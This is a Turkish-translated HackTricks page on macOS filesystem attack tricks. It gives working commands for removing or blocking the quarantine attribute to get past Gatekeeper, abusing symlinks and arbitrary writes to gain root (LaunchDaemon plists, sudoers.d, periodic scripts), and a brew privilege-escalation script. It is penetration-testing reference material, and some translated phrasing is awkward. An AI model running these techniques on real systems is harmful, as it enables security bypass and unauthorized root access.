# macOS FS Hileleri

<details>

<summary><strong>A'dan Z'ye AWS hackleme konusunu öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## POSIX izin kombinasyonları

Bir **dizin** içindeki izinler:

* **okuma** - dizin girişlerini **listeleyebilirsiniz**
* **yazma** - dizinde **dosyaları silebilir/yazabilirsiniz** ve **boş klasörleri silebilirsiniz**.
* Ancak **doluluk klasörlerini silemez/değiştiremezsiniz** yazma izniniz olmadıkça.
* Bir klasörün adını **değiştiremezsiniz** sahip olmadıkça.
* **çalıştırma** - dizini **gezebilmenize izin verilir** - bu hakkınız yoksa, içindeki dosyalara veya alt dizinlere erişemezsiniz.

### Tehlikeli Kombinasyonlar

**Root'a ait bir dosya/dizini nasıl üzerine yazabilirsiniz**, ancak:

* Yol üzerinde bir ebeveyn **dizin sahibi** kullanıcı ise
* Yol üzerinde bir ebeveyn **dizin sahibi** kullanıcı grubu ve **yazma erişimi** varsa
* Bir kullanıcı grubunun **dosyaya yazma** erişimi varsa

Önceki kombinasyonlardan herhangi biriyle, bir saldırgan ayrıcalıklı keyfi yazma elde etmek için beklenen yola bir **sembolik/sabit bağ** enjekte edebilir.

### Dizin kökü R+X Özel durum

Eğer bir **dizinde yalnızca root'un R+X erişimi varsa** dosyalar **başka kimseye erişilemez**. Bu nedenle, bir kullanıcı tarafından okunabilen ancak bu **kısıtlama** nedeniyle okunamayan bir dosyanın bu klasörden **başka bir klasöre taşınmasına** izin veren bir zafiyet, bu dosyaları okumak için kötüye kullanılabilir.

Örnek: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Sembolik Bağlantı / Sabit Bağlantı

Eğer ayrıcalıklı bir işlem **düşük ayrıcalıklı bir kullanıcı tarafından kontrol edilebilen bir dosyaya yazıyorsa**, veya daha önceden düşük ayrıcalıklı bir kullanıcı tarafından oluşturulmuşsa. Kullanıcı sadece bir Sembolik veya Sabit bağlantı aracılığıyla onu başka bir dosyaya **yönlendirebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.

Saldırganın ayrıcalıkları yükseltmek için keyfi yazmayı kötüye kullanabileceği diğer bölümlere bakın.

## .fileloc

**`.fileloc`** uzantılı dosyalar diğer uygulamalara veya ikili dosyalara işaret edebilir, bu nedenle açıldığında uygulama/ikili dosya çalıştırılacaktır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Keyfi FD

Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya** zorlayabilirseniz, **`crontab`**'ı kötüye kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilirsiniz, böylece `exploit.py` `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanacaktır.

Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Karantina xattrs hilelerinden kaçınma

### Kaldırma
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable bayrağı

Bir dosya/dizin bu değişmez özelliğe sahipse üzerine bir xattr eklemek mümkün olmayacaktır.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Bir **devfs** bağlantısı **xattr**'ı desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) adresine bakın.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, dekompresyon yapılmış dosyada ACL olarak ayarlanacaktır. Dolayısıyla, bir uygulamayı diğer xattr'lerin yazılmasını engelleyen bir ACL ile AppleDouble dosya formatına sahip bir zip dosyasına sıkıştırdıysanız... karantina xattr uygulamaya ayarlanmamış olacaktır:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.

Bunu çoğaltmak için önce doğru acl dizesini almalıyız:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile, kum havuzu yazma karantina xattr'yi önce yazar)

Gerçekten gerekli değil ama her ihtimale karşı orada bırakıyorum:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Kod İmzalarını Atlatma

Bundles, **`_CodeSignature/CodeResources`** dosyasını içerir, bu dosya **bündle** içindeki her **dosyanın karma** değerini içerir. CodeResources'un karma değeri aynı zamanda **yürütülebilir dosyaya gömülüdür**, bu yüzden onunla oynayamayız.

Ancak, imzası kontrol edilmeyecek bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Aşağıdaki komutu kullanarak bir kaynağın imzasını CLI üzerinden hesaplamak mümkündür:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Dmg'leri Bağlama

Bir kullanıcı, hatta bazı mevcut klasörlerin üstüne bile oluşturulmuş özel bir dmg'yi bağlayabilir. Özel içeriğe sahip bir özel dmg paketi oluşturabileceğiniz şu şekilde:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Genellikle macOS, `com.apple.DiskArbitrarion.diskarbitrariond` Mach hizmetiyle konuşarak disk bağlar (`/usr/libexec/diskarbitrationd` tarafından sağlanır). Başlatma Daemon'ları plist dosyasına `-d` parametresini ekleyerek ve yeniden başlatarak, logları `/var/log/diskarbitrationd.log` dosyasında saklayacaktır.\
Ancak, `hdik` ve `hdiutil` gibi araçları kullanarak doğrudan `com.apple.driver.DiskImages` kext'i ile iletişim kurmak mümkündür.

## Keyfi Yazma

### Periyodik sh betikleri

Eğer betiğiniz bir **shell betiği** olarak yorumlanabilirse, **her gün tetiklenecek olan** **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.

Bu betiği şu şekilde **sahte** bir şekilde çalıştırabilirsiniz: **`sudo periodic daily`**

### Daemonlar

Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** adında bir plist dosyası oluşturun ve keyfi bir betik çalıştıran bir plist dosyası oluşturun:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers Dosyası

Eğer **keyfi yazma** yetkiniz varsa, kendinize **sudo** ayrıcalıkları tanıyan bir dosya oluşturabilirsiniz. Bu dosya **`/etc/sudoers.d/`** klasörü içinde yer almalıdır.

### PATH Dosyaları

**`/etc/paths`** dosyası, PATH ortam değişkenini dolduran ana yerlerden biridir. Bu dosyayı üzerine yazmak için root olmanız gerekir, ancak bir **yetkili işlem** tarafından **tam yol olmadan komut** çalıştırılıyorsa, bu dosyayı değiştirerek onu **ele geçirebilirsiniz**.

`PATH` ortam değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar yazabilirsiniz.

## Diğer kullanıcılar tarafından yazılabilir dosyalar oluşturma

Bu, root'a ait ancak benim tarafımdan yazılabilir bir dosya oluşturacaktır ([**buradan kod**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Bu ayrıca bir ayrıcalık yükseltme olarak çalışabilir.
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Referanslar

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
